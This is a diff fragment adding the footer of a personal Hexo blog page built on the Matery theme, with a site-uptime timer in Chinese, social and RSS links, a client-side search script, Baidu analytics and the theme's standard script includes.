+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+                        <br>
+                    </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
+        <i class="fab fa-telegram"></i>
+    </a>
+
+
+
+    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    var cnt = 1;
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var content_index = [];
+                        var data_title_origin = data.title.trim();
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
+                            cnt += 1;
+    
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 300 characters
+                                var start = first_occur - 30;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                var match_content = content.substr(start, 300);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+    
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    str = "<p class=\"search-result-summary\">共找到 " + String(cnt-1) + " 条结果</p>"  + str;
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.min.js"></script>
+
+    
+
+    
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
